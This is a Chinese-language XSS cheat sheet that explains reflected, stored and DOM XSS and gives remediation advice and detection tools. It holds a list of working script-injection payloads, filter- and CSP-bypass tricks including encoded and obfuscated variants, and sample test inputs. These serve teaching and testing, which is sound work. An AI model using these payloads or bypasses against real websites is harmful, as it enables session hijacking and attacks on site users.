# XSS 跨站脚本攻击与修复方案

## 1. 三大类型

| 类型 | 描述 | 特征 |
|------|------|------|
| 反射型 XSS | 恶意脚本藏在 URL，被服务端拼接到 HTML 中返回 | 需要用户点击恶意链接 |
| 存储型 XSS | 恶意脚本被存入数据库，后续访问都会被执行 | 危害最大，无需社工诱导 |
| DOM 型 XSS | 纯前端 JS 解析 URL/输入并写入 DOM，不经过服务端 | 特征是页面源码中没有 payload，需在 DOM 中查看 |

## 2. 经典 Payload 速查

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<a href="javascript:alert(1)">click</a>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext></mtext><img onerror=alert(1) src=x></math>

<!-- 长度限制 -->
<script>eval(name)</script>          # 把 payload 放在 window.name
<img src=x onerror=eval.call(null,location.hash.slice(1))>

<!-- Bypass 过滤 -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src="x" onerror="a=alert,a`1`">
<img src=x onerror=&#97;lert(1)>
<img src=x onerror=eval('\x61\x6c\x65\x72\x74(1)')>
```

## 3. Bypass 常见过滤

- **关键字 `script` 被过滤**：使用 SVG/img/onerror 事件触发
- **引号被过滤**：使用反引号 `` ` `` 或不用引号
- **空格被过滤**：使用 `/`、`%09`、`%0a`、`/**/` 等替代
- **`alert` 被过滤**：`confirm`、`prompt`、`top['ale'+'rt']`、`window[atob('YWxlcnQ=')]`
- **HTML 实体编码 / URL 编码 / Unicode 编码**
- **CSP 绕过**：JSONP 端点、`unsafe-inline`、`base-uri` 缺陷、`object-src` 缺失

## 4. DOM XSS sink 速查

JavaScript 中可能导致 DOM XSS 的危险函数：

- `document.write()`、`document.writeln()`
- `element.innerHTML`、`outerHTML`
- `element.src = javascript:...`
- `eval()`、`setTimeout(string)`、`setInterval(string)`、`new Function()`
- `location`、`document.location`、`window.open()`
- `jQuery.html()`、`.append()`、`.prepend()`、`.after()`、`.before()`

来源（source）：`location.hash`、`location.search`、`document.referrer`、`window.name`、`postMessage`、`localStorage`

## 5. 业务场景案例

- **评论/留言板**：存储型 XSS，最经典场景
- **搜索框**：`?q=<script>`，典型反射型
- **用户资料头像 URL**：`" onerror=alert(1) "`
- **富文本编辑器**：需严格白名单过滤 HTML 标签与属性
- **URL 参数回显**：如 `?redirect=...`、`?msg=登录失败`
- **自定义错误页**：回显路径，`404 /<script>alert(1)</script>`

## 6. 修复方案

1. **对不可信输入做 HTML 编码**（`&` → `&amp;`、`<` → `&lt;`、`>` → `&gt;`、`"` → `&quot;`、`'` → `&#x27;`）
2. **使用安全模板引擎**：React/Angular/Vue 默认转义；避免 `v-html` / `dangerouslySetInnerHTML` / `ng-bind-html`
3. **富文本场景使用白名单过滤**：`DOMPurify`、`Jsoup` 的 Safelist
4. **Cookie 设置 HttpOnly / Secure / SameSite**，降低会话劫持影响
5. **CSP 响应头**：
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
   ```
6. **设置 `X-XSS-Protection: 1; mode=block`（已被大部分浏览器废弃，建议依赖 CSP）**
7. **输入校验 + 输出编码 双重防线**

## 7. 快速检测

- **自动化**：Xray / Burp Active Scanner / OWASP ZAP / `xsstrike.py`
- **人工速查**：在输入框填入 `"><script>alert(1)</script>`、`"><img src=x onerror=alert(1)>`、`javascript:alert(1)`
- **Chrome DevTools**：Console 查看报错，Elements 查看 DOM
